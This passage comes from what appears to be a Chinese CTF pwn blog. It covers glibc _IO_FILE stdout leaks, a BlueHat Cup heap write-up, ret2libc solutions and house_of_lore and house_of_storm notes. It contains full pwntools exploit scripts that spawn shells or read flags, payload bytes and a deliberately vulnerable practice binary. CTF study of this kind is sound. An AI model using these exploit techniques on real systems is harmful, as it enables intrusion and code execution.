0x7ffff7dca2a0&#125;\n_IO_file_jumps，同 *vtable\npwndbg&gt; p _IO_file_jumps$3 = &#123;  __dummy = 0,   __dummy2 = 0,   __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;,   __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;,   __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;,   __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;,   __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;,   __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;,   __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;,   __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;,   __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;,   __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;,   __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;,   __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;,   __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;,   __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;,   __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;,   __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;,   __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;,   __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;,   __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125;\n_IO_FILE结构体中，_chain字段指向下一个链表节点,此处指向的是stdout\npwndbg&gt;  p  *(struct _IO_FILE_plus *) stdout$1 = &#123;  file = &#123;    _flags = -72540028,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dcda00 &lt;_IO_2_1_stdin_&gt;,     _fileno = 1, //文件描述符，stderr的fileno值为2，stdout的fileno值为1    _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7ffff7dcf8c0 &lt;_IO_stdfile_1_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd8c0 &lt;_IO_wide_data_1&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125;\n利用_fileno字段_fileno的值就是文件描述符，位于stdin文件结构开头0x70偏移处我们可以尝试篡改_fileno以重定位需要读取的文件例子之后再放\nIO_FILE_leak\nint _IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\n将堆块分配到stdout指针处存储的_IO_2_1_stdout_该IO_FILE结构体处修改其_flags为0xfbad1800，将后面三个read指针置空将_IO_write_base处的第一个字节改为0x58，后面的_IO_write_ptr和_IO_write_end保持不变。之后当程序遇到puts函数时就会打印_IO_write_base到_IO_write_ptr之间的内容按照上面步骤改动的话，我们泄露出的第一个libc地址是_IO_file_jumps。常用的payload如下所示，至于为啥需要flags&#x3D;0xfbad1800（flags也可以是0xfbad3887），这里分析起来十分复杂，可以参见puts源码，只能说为了达到输出效果需要这样设置另外该flags这样设置只是针对puts函数，其余打印函数略有不同。\npayload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot;\n\npayload = p64(0xfbad3887)+p64(0)*3+p8(0)\n存一个environ泄露栈地址\np2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addr\n前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"BlueHatCup_semi_pwns","url":"/2023/09/17/blue-cup-pwns/","content":"对大佬来说很简单，对我这种菜猫来说刚刚好UAFchecksec\n└─# checksec main[*] &#x27;/mnt/attachment/main&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\n进入debugmode前存在格式化字符串漏洞，可以泄露stack\nvoid __noreturn sub_1336()&#123;  void *v0; // [rsp+0h] [rbp-20h] BYREF  const void *buf; // [rsp+8h] [rbp-18h] BYREF  char s[8]; // [rsp+14h] [rbp-Ch] BYREF  int v3; // [rsp+1Ch] [rbp-4h]  puts(&quot;Tell me ur name: &quot;);  memset(s, 0, sizeof(s));  read(0, s, 8uLL);  printf(s);  puts(&quot;DEBUG MODE ON&quot;);  puts(&quot;1. READ&quot;);  puts(&quot;2. WRITE&quot;);  puts(&quot;&gt;&gt; &quot;);  v3 = sub_12F0();  if ( v3 == 1 )  &#123;    puts(&quot;READ MODE: &quot;);    read(0, &amp;buf, 8uLL);    write(0, buf, 8uLL);  &#125;  if ( v3 == 2 )  &#123;    puts(&quot;WRITE MODE: &quot;);    read(0, &amp;v0, 8uLL);    read(0, v0, 8uLL);  &#125;  exit(0);&#125;\n有两种方法进入debug，case4,当没有初始化堆时能进入\nif ( !v3 )  &#123;    puts(&quot;Nothing to show&quot;);    puts(&quot;May be need to check?&quot;);    sub_1336();  &#125;\n\ncase5，login为admin\nint sub_1836()&#123;  char s[16]; // [rsp+0h] [rbp-10h] BYREF  memset(s, 0, sizeof(s));  puts(&quot;Passwd: &quot;);  read(0, s, 0x10uLL);  if ( !strcmp(s, s2) )  &#123;    puts(&quot;Login Success!&quot;);    sub_1336();  &#125;  return puts(&quot;Login Failed!&quot;);&#125;\n密码在这\n.data:0000000000004010 31 32 33 34 35 36 37 38 39 30+s2 db &#x27;1234567890&#x27;,0 \n\n接下来看堆部分add没有对chunk大小进行限制限制了16个chunk\nint sub_14B9()&#123;  int result; // eax  char s[512]; // [rsp+0h] [rbp-210h] BYREF  void *dest; // [rsp+200h] [rbp-10h]  int v3; // [rsp+208h] [rbp-8h]  int i; // [rsp+20Ch] [rbp-4h]  for ( i = 0; i &lt;= 16 &amp;&amp; qword_40A0[i]; ++i )    ;  if ( i == 16 )    return puts(&quot;No Space!&quot;);  puts(&quot;Tell me the book content size: &quot;);  v3 = sub_12F0();  memset(s, 0, sizeof(s));  puts(&quot;Tell me the book content: &quot;);  read(0, s, v3);  dest = malloc(v3);  memcpy(dest, s, v3);  qword_40A0[i] = dest;  result = v3;  dword_4060[i] = v3;  return result;&#125;\ndelete没有置空指针存在uaf，但是是glibc2.31，doublefree需要改key但是可以unsorted泄露libc\n&#123;  _DWORD *v0; // rax  unsigned int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Tell me the book index: &quot;);  v2 = sub_12F0();  if ( qword_40A0[v2] &amp;&amp; v2 &lt;= 0xF )  &#123;    free((void *)qword_40A0[v2]);    v0 = dword_4060;    dword_4060[v2] = 0;  &#125;  else  &#123;    LODWORD(v0) = puts(&quot;Invalid!&quot;);  &#125;  return (int)v0;&#125;\n可以通过unsortedbin来泄露libc\ndebugmode最后有个exit,考虑打exithook\nfrom pwn import *p = remote(&#x27;120.78.172.238&#x27;,49149)#p = process(&#x27;./main&#x27;)elf = ELF(&quot;./main&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;Tell me the book content size:&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;Tell me the book content:&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Tell me the book index:&#x27;)    p.sendline(str(index))def edit(index,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Tell me the book index:&quot;)    p.sendline(str(index))    p.sendlineafter(b&quot;Tell me the book content:&quot;,payload)def check():    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)def login():    p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;5&#x27;)    p.sendlineafter(b&#x27;Passwd: \\n&#x27;, b&#x27;1234567890\\x00&#x27;)one_gadgets= [0xe6c7e,0xe6c81,0xe6c84]add(0x420,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1delete(0)check()  #leak_libclibc_base = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)) - 0x1ebbe0#debug4offsetsuccess(&#x27;libc_base:%s&#x27;,libc_base)free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]sys_addr=libc_base+libc.sym[&#x27;system&#x27;]bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))one_gadget = libc_base + 0xe6c7e#debug()login()p.sendlineafter(b&#x27;name: \\n&#x27;, b&#x27;%7$p&#x27;)p.recvuntil(b&#x27;0x&#x27;)stack = int(p.recv(12), 16) #leak_stack#success(&#x27;stack:%s&#x27;,hex(stack))exit_hook = libc_base + 0x222060 + 3848 #exit_hook#success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;2&#x27;)p.sendafter(b&#x27;WRITE MODE: \\n&#x27;, p64(exit_hook))sleep(1)p.sendline(p64(one_gadget))#pause()success(&#x27;libc_base:%s&#x27;,libc_base)success(&#x27;sys_addr:%s&#x27;,hex(sys_addr))success(&#x27;bin_sh:%s&#x27;,hex(bin_sh))success(&#x27;one_gadget:%s&#x27;,hex(one_gadget))success(&#x27;stack:%s&#x27;,hex(stack))success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.interactive()\n","categories":["wp"]},{"title":"山石安研院2023CTF夏令营_pwn","url":"/2023/08/19/HSNCTF-2023-summer/","content":"两道题都用ret2libc了，最后一道heap0解ret2syscall\nfrom pwn import*from LibcSearcher import *elf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49003)pop_rdi_ret = 0x40072bret_addr = 0x400509main_addr = 0x4006c7syscall = 0x400741puts_plt = 0x400520puts_got = 0x601018payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8 + p64(ret_addr)+ p64(pop_rdi_ret) + p64(0x601048) + p64(system_addr)p.sendline(payload)p.interactive()\n\nret2libc\nfrom pwn import*import sgtlibcelf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49002)libc =ELF(&#x27;libc-2.23.so&#x27;)pop_rdi_ret = 0x400783ret_addr = 0x400509main_addr = 0x4006FDputs_plt = 0x400520puts_got = 0x601018bss = 0x601060payload1 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload1)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=3) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload2 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)p.sendlineafter(&quot;name:&quot;,payload2)p.interactive()#LibcSearcher 扫出来的死都不对，气煞我也！\n","categories":["wp"],"tags":["ret2libc"]},{"title":"house_of_lore","url":"/2023/11/03/house-of-lore/","content":"unsorted bin + small bin还有largebin版本的利用比较类似\n贴一波smallbin的源码\n/*       If a small request, check regular bin.  Since these &quot;smallbins&quot;       hold one size each, no searching within bins is necessary.       (For a large request, we need to wait until unsorted chunks are       processed to find best fit. But for small ones, fits are exact       anyway, so we can check now, which is faster.)     */    if (in_smallbin_range(nb)) &#123;        // 获取 small bin 的索引        idx = smallbin_index(nb);        // 获取对应 small bin 中的 chunk 指针        bin = bin_at(av, idx);        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk        // 如果 victim = bin ，那说明该 bin 为空。        // 如果不相等，那么会有两种情况        if ((victim = last(bin)) != bin) &#123;            // 第一种情况，small bin 还没有初始化。            if (victim == 0) /* initialization check */                // 执行初始化，将 fast bins 中的 chunk 进行合并                malloc_consolidate(av);            // 第二种情况，small bin 中存在空闲的 chunk            else &#123;                // 获取 small bin 中倒数第二个 chunk 。                bck = victim-&gt;bk;                // 检查 bck-&gt;fd 是不是 victim，防止伪造                if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                    goto errout;                &#125;                // 设置 victim 对应的 inuse 位                set_inuse_bit_at_offset(victim, nb);                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来                bin-&gt;bk = bck;                bck-&gt;fd = bin;                // 如果不是 main_arena，设置对应的标志                if (av != &amp;main_arena) set_non_main_arena(victim);                // 细致的检查                check_malloced_chunk(av, victim, nb);                // 将申请到的 chunk 转化为对应的 mem 状态                void *p = chunk2mem(victim);                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff                alloc_perturb(p, bytes);                return p;            &#125;        &#125;    &#125;\n这段程序来自how2heap的house_of_lore,(glibc-2.27 version)展示了unsortedbin的house of lore\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; \tfprintf(stderr, &quot;Nice jump d00d\\n&quot;); \texit(0); &#125;int main(int argc, char * argv[])&#123;   intptr_t *victim = malloc(0x100);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);//先填满tache   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[4] = &#123;0&#125;;  void* fake_freelist[7][4];  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;//在栈上伪造一段fake_free_list，来骗    stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;//绕过smallbin的检查   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;//绕过smallbin检查   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];//防止crash     void *p5 = malloc(1000);//防止合并   for(int i=0; i&lt;7; i++) free(dummies[i]);  free((void*)victim);//free进unsortedbin   fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);//此时根据首个unsortedbin的特性，该chunk的fd和bk指针将会指向libc   void *p2 = malloc(1200);//申请一个smallbin和unsortedbin的都无法满足其大小的堆块   //此时，我们原本的申请的victim就会被插入到smallbin的前面   //而且它的fd和bk更新      fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  //模拟UAF篡改victim的过程   victim[1] = (intptr_t)stack_buffer_1;   //------------------------------------  for(int i=0; i&lt;7; i++) malloc(0x100);//清空tache   void *p3 = malloc(0x100);//来骗！  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);// 来偷袭！ chunk2stack   fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4);   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  //  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n写了个小文件,几乎啥漏洞都能打（\n//gcc lore.c -g  -o lore //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;5. Exit&quot;);    puts(&quot;6. Magic&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about&quot;);    puts(&quot;\t **  ** ******    **    ******  **&quot;);\tputs(&quot;\t**__** **__     ****   **__**  **&quot;);\tputs(&quot; **  ** **      **__**  *****   **&quot;);\tputs(&quot;**  ** ****** ******** **      __&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;input you passwd:&quot;);    mmap((void*)0xACE00000,0x1200ull,7,33,-1,0ll);    read(0,(void*)0xACE00000,0x233);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);    mmap((void*)0xbad00000,0x120ull,7,33,-1,0ll);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;            case 6:                puts(&quot;Use your force! CTFer&quot;);                read(0,(void*)0xbad00000,0x66);        &#125;    &#125;&#125;\n\n┌──(str1d3r㉿str1k3Gwindows)-[~/桌面/Desktop]└─$ checksec lore[*] &#x27;/mnt/Desktop/lore&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nfrom pwn import*from pwn import p64,u64p = process(&quot;./lore&quot;)elf = ELF(&quot;./lore&quot;)#libc = ELF(&quot;./libc-2.27.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(magic,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;say a magic word before your build&quot;)    p.sendline(str(magic))    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def exit():    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;5&#x27;)def magic(magic):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;6&#x27;)    p.recvuntil(b&quot;Use your force! CTFer&quot;)    p.sendline(str(magic))orw = b&quot;\\x90&quot; * 0x100orw  += asm(shellcraft.open(&quot;/flag&quot;))orw  += asm(shellcraft.read(3, 0xACE00500, 0x500))orw  += asm(shellcraft.write(1, 0xACE00500, 0x500))orw_addr = 0xACE00500stack_buffer_addr = 0xbad00000p.recvuntil(b&#x27;passwd:&#x27;)p.sendline(orw)add(0x100,b&#x27;aaaa&#x27;)#victimadd(0x100,b&#x27;aaaa&#x27;)delete(0)delete(1)show(1)victim =u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&quot;chunk0_addr:%s&quot;,hex(victim))#stack_buffer_1-&gt;fd=stack_buffer_1[2]=victimstack_buff = p64(0) +p64(0x500)stack_buff += p64(stack_buffer_addr)stack_buff +=p64(victim)magic(stack_buff)add(0x100,b&#x27;aaaa&#x27;)#victimfor i in range(7):    add(0x100,b&#x27;bbbb&#x27;)#tcacheadd(1000,b&#x27;cccc&#x27;)for i in range(7):    delete(i+1)add(1200,b&#x27;dddd&#x27;)delete(0)edit(0,0x100,p64(0)+p64(stack_buffer_addr))for i in range(7):    add(0x100,b&#x27;aaaa&#x27;)#tcacheadd(0x100,b&#x27;aaaa&#x27;)add(0x100,p64(0)+p64(orw_addr))\n\n\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_storm","url":"/2023/10/13/house-of-storm/","content":"I’m the storm that is approching\n从https://www.cnblogs.com/Rookle/p/13140339.html来的关键源码+注释orz\n//#define unsorted_chunks(M)          (bin_at (M, 1))//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunkwhile ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;    bck = victim-&gt;bk;//取出unsorted的尾部的chunk    /*        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size         中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在         unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接         victim-&gt;size 没有问题。    */    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,                        chunk2mem(victim), av);    size = chunksize(victim);//获取victim的size\t/*        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。                last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分        形成一个 chunk，last_remainder 就是 指向的这个 chunk。    */    if (in_smallbin_range(nb) &amp;&amp;        bck == unsorted_chunks(av) &amp;&amp;        victim == av-&gt;last_remainder &amp;&amp;        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;        //分割remainder        remainder_size = size - nb;//计算分割后剩下的size        remainder = chunk_at_offset(victim, nb);//获取remainder的地址        //把remainder加入unsorted bin中        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零        if (!in_smallbin_range(remainder_size)) &#123;            remainder-&gt;fd_nextsize = NULL;            remainder-&gt;fd_nextsize = NULL;        &#125;\t\t//设置victim的size        set_head(victim, nb | PREV_INUSE |                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));        //设置remainder的size        set_head(remainder, remainder_size | PREV_INUSE);        //设置remainder的物理相邻的下一个chunk的prev_size        set_foot(remainder, remainder_size);        check_malloced_chunk(av, victim, nb);//默认不做任何操作        void *p = chunk2mem(victim);//将chunk指针转化为mem指针        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做        return p;    &#125;    //把victim从unsorted bin 中移除    unsorted_chunks(av)-&gt;bk = bck;    bck-&gt;fd = unsorted_chunks(av);    //如果 victim 的size 与申请的size相等，那么就返回其。    if (size == nb) &#123;        //设置victim物理相邻的下一个chunk的prev_inuse位        